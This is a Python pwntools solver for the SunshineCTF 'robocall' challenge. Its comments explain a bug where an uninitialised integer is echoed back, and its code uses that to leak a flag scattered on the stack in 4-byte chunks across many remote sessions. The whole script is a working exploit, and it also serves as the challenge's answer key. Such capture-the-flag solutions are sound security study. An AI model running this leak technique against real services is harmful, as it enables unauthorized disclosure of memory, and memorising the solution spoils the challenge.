#!/usr/bin/env python3
# robocall (SunshineCTF) solver.
# Bug: cancel_plan() echoes an UNINITIALISED int ("You've entered X") when both
# menu reads fail to parse. That int = stale stack = one 4-byte flag chunk that
# place_flag() scattered on the stack. The chunk depends on call depth, which we
# steer with menu "bounces": 's'=scream (+0x120), 'r'=report_outage (+0x400),
# 'c'=cancel-press1 bounce.  Each recipe below leaks a fixed chunk index.
#
# Usage:  python3 solve.py                    # local ./robocall
#         python3 solve.py sunshinectf.games 26199
import sys
from pwn import *
context.log_level = 'error'

HOST = sys.argv[1] if len(sys.argv) >= 3 else None
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else None

def spawn():
    return remote(HOST, PORT, timeout=8) if HOST else process('./robocall', timeout=8)

def start(io): io.sendlineafter(b'frustrated are you?', b'42')
def sp(io, c): io.recvuntil(b'the FTC.'); io.sendline(str(c).encode())

def scream(io):
    sp(io, 3); io.recvuntil(b'scale of 1 to 10'); io.sendline(b'5')
def report(io):
    sp(io, 1); io.recvuntil(b'these options again'); io.sendline(b'2')
    io.recvuntil(b'outage address'); io.sendline(b'addr')
def cancelb(io):
    sp(io, 1); io.recvuntil(b'these options again'); io.sendline(b'6')
    io.recvuntil(b'operator press 3'); io.sendline(b'2')
    for _ in range(3): io.sendline(b'z')
    io.recvuntil(b'are you sure you want to stop'); io.sendline(b'1')
BF = {'s': scream, 'r': report, 'c': cancelb}

def descend_leak(io):
    sp(io, 1); io.recvuntil(b'these options again'); io.sendline(b'6')
    io.recvuntil(b'operator press 3'); io.sendline(b'2')
    for _ in range(3): io.sendline(b'z')                      # login_roleplay
    io.recvuntil(b'are you sure you want to stop'); io.sendline(b'x')
    io.recvuntil(b'Are you not sure'); io.sendline(b'x')
    io.recvuntil(b"You've entered \"")
    return int(io.recvuntil(b'"', drop=True))

def leak(recipe):
    io = spawn(); start(io)
    for ch in recipe: BF[ch](io)
    v = descend_leak(io); io.close()
    return (v & 0xffffffff).to_bytes(4, 'little')

RECIPE = {0:'r', 1:'ssss', 2:'sr', 4:'sssss', 5:'ssr',
          7:'ssssss', 8:'sssr', 10:'sssssss', 11:'rr', 12:'c'}

chunks = {}
for idx, rec in sorted(RECIPE.items()):
    try:
        chunks[idx] = leak(rec)
    except Exception as e:
        chunks[idx] = b'????'
    print("chunk %2d  recipe=%-8s -> %r" % (idx, rec, chunks[idx]), flush=True)

out = b''.join(chunks.get(i, b'????') for i in range(13))
print("\nflag (?? = chunks 3/6/9, harder alignment):",
      out.split(b'\x00')[0].decode('latin1'), flush=True)
